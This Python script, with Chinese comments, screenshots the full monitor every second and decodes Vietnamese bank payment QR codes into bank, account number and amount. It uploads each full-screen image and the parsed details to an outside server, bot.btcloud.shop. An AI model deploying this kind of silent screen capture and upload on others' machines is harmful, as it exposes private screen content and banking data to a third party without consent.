import cv2
import numpy as np
import mss
import time
import re
import requests
import hashlib
import os


# ==================== 1) 完整银行代码表 ====================
bank_codes = {
    "970415": "VietinBank (ICB)",
    "970436": "Vietcombank (VCB)",
    "970418": "BIDV",
    "970405": "Agribank (VBA)",
    "970448": "OCB",
    "970422": "MBBank (MB)",
    "970407": "Techcombank (TCB)",
    "970416": "ACB",
    "970432": "VPBank (VPB)",
    "970423": "TPBank (TPB)",
    "970403": "Sacombank (STB)",
    "970437": "HDBank (HDB)",
    "970454": "VietCapitalBank (VCCB)",
    "970429": "SCB",
    "970441": "VIB",
    "970443": "SHB",
    "970431": "Eximbank (EIB)",
    "970426": "MSB",
    "546034": "CAKE",
    "546035": "Ubank",
    "963388": "Timo",
    "971005": "ViettelMoney (VTLMONEY)",
    "971011": "VNPTMoney",
    "970400": "SaigonBank (SGICB)",
    "970409": "BacABank (BAB)",
    "970412": "PVcomBank (PVCB)",
    "970414": "Oceanbank",
    "970419": "NCB",
    "970424": "ShinhanBank (SHBVN)",
    "970425": "ABBANK (ABB)",
    "970427": "VietABank (VAB)",
    "970428": "NamABank (NAB)",
    "970430": "PGBank (PGB)",
    "970433": "VietBank (VIETBANK)",
    "970438": "BaoVietBank (BVB)",
    "970440": "SeABank (SEAB)",
    "970446": "COOPBANK",
    "970449": "LPBank (LPB)",
    "970452": "KienLongBank (KLB)",
    "668888": "KBank",
    "970462": "KookminHN (KBHN)",
    "970466": "KEBHanaHCM",
    "970467": "KEBHanaHN",
    "977777": "MAFC",
    "533948": "Citibank",
    "970463": "KookminHCM (KBHCM)",
    "999888": "VBSP",
    "970457": "Woori (WVN)",
    "970421": "VRB",
    "970458": "UnitedOverseas (UOB)",
    "970410": "StandardChartered (SCVN)",
    "970439": "PublicBank (PBVN)",
    "801011": "Nonghyup (NHB HN)",
    "970434": "IndovinaBank (IVB)",
    "970456": "IBKHCM",
    "970455": "IBKHN",
    "458761": "HSBC",
    "970442": "HongLeong (HLBVN)",
    "970408": "GPBank (GPB)",
    "970406": "DongABank (DOB)",
    "796500": "DBSBank (DBS)",
    "422589": "CIMB",
    "970444": "CBBank (CBB)",
}

# 记录上次上传时间，避免1分钟内重复
last_post_time = {}  # key=(account, amount), value=timestamp

def capture_screen():
    """捕获屏幕并返回图像"""
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        img = np.array(screenshot)
        return cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)


def detect_qr_code(image):
    """使用 OpenCV 识别二维码"""
    qr_decoder = cv2.QRCodeDetector()
    data, _, _ = qr_decoder.detectAndDecode(image)
    return data if data else None


def parse_qr_data(qr_data):
    """
    解析二维码内容，提取:
      1) 银行名称 (bank_name)
      2) 银行账号 (account) —— 银行代码后面4位随机数 + 真正账号；遇到"0208"/非数字则终止
      3) 金额 (amount)
    """
    print(f"二维码原始内容: {qr_data}")  # 调试观察
    bank_name = None
    account = None
    amount = None

    # ====== (1) 找银行代码 & 银行名称 ======
    bank_code_index = -1
    found_code = None
    for code, name in bank_codes.items():
        idx = qr_data.find(code)
        if idx != -1:  # 找到匹配
            bank_name = name
            bank_code_index = idx
            found_code = code
            break

    if bank_code_index != -1 and found_code:
        # 截取 bank_code 之后的子串
        sub_after_bank = qr_data[bank_code_index + len(found_code):]
        # 正则: ^(\d{4})(\d+?)(?=0208|[^0-9]|$)
        pattern = r'^(\d{4})(\d+?)(?=0208|[^0-9]|$)'
        m = re.match(pattern, sub_after_bank)
        if m:
            account = m.group(2)
        else:
            # 如果上面没匹配到，就用简化逻辑：先跳过4位，再把后续数字当账号
            if len(sub_after_bank) >= 4 and sub_after_bank[:4].isdigit():
                rest = sub_after_bank[4:]
                digits = []
                for ch in rest:
                    if ch.isdigit():
                        digits.append(ch)
                    else:
                        break
                if digits:
                    account = "".join(digits)

    # ====== (2) 解析金额 (先试EMV Tag 54, 再试5303...5802VN) ======
    # --- 2.1) 优先用 EMV Tag 54 ---
    i = 0
    while i < len(qr_data) - 3:
        if qr_data[i:i+2] == "54":
            length_str = qr_data[i+2:i+4]
            if length_str.isdigit():
                length_val = int(length_str)
                amount_str = qr_data[i+4:i+4+length_val]
                if re.match(r'^\d+(\.\d+)?$', amount_str):
                    try:
                        amount = float(amount_str)
                        break
                    except ValueError:
                        pass
        i += 1

    # --- 2.2) 若Tag 54未取到，再用5303(\d+)5802VN兜底 ---
    if amount is None:
        match_amount_block = re.search(r'5303(\d+)5802VN', qr_data)
        if match_amount_block:
            block = match_amount_block.group(1)
            # 从后往前匹配纯数字
            match_amount = re.search(r'(\d+)$', block)
            if match_amount:
                try:
                    amount = float(match_amount.group(1))
                except ValueError:
                    amount = None

    # ====== (3) 调试提示 ======
    if not bank_name:
        print("⚠️ 未能匹配到已知银行代码，请确认二维码或完善 bank_codes。")
    if not account:
        print("⚠️ 未能截取到正确的银行账号。")
    if amount is None:
        print("⚠️ 未能解析出金额。")

    return bank_name, account, amount


def post_to_server(bank_name, account, amount, image_path):
    """
    向服务器上传截图和数据。
    同账号+金额，如1分钟内重复，则跳过上传。
    """
    now = time.time()
    key = (account, amount)
    if key in last_post_time and (now - last_post_time[key] < 60):
        print(f"⚠️ [同账号+金额] 1分钟内已上传过，跳过发送 => {account}, {amount}")
        return

    url = "https://bot.btcloud.shop/jiankong"
    message_str = f"bank: {bank_name}, account: {account}, amount: {amount}"
    data = {
        "message": message_str
    }

    try:
        with open(image_path, "rb") as f:
            files = {"file": f}
            response = requests.post(url, data=data, files=files, timeout=10)
            print("✅ 已上传至服务器:", response.status_code, response.text)
    except Exception as e:
        print("❌ 上传出错:", e)

    # 更新上次上传时间
    last_post_time[key] = now


def main():
    print("开始监控屏幕二维码...")

    while True:
        # 1) 截屏
        frame = capture_screen()
        # 2) 识别 QR
        qr_data = detect_qr_code(frame)

        if qr_data:
            # 3) 解析银行名称、账号、金额
            bank_name, account, amount = parse_qr_data(qr_data)

            # 4) 保存本地截图 (先确定目标文件夹)
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            if account:
                # 以账号为文件夹名
                os.makedirs(account, exist_ok=True)
                filename = os.path.join(account, f"qrcode_detected_{timestamp}.png")
            else:
                # 若账号识别不到，就存在 "unknown" 文件夹
                os.makedirs("unknown", exist_ok=True)
                filename = os.path.join("unknown", f"qrcode_detected_{timestamp}.png")

            cv2.imwrite(filename, frame)

            # 5) 打印或上传
            if bank_name and account and (amount is not None):
                # 统一输出格式
                if amount.is_integer():
                    amount_str = f"{int(amount):,}"
                else:
                    amount_str = f"{amount:,.2f}"

                print(f"✅ 识别成功: [银行={bank_name}], [账号={account}], [金额={amount_str} VND]")
                print(f"✅ 已保存截图: {filename}")

                # ======== 上传到服务器（同账号+金额，1分钟内只上传一次） ========
                post_to_server(bank_name, account, amount_str, filename)

            else:
                print(f"⚠️ 检测到二维码，已保存截图: {filename}")
                print("⚠️ 但未能准确识别所有字段，请检查二维码内容或解析逻辑。")

        time.sleep(1)


if __name__ == "__main__":
    main()
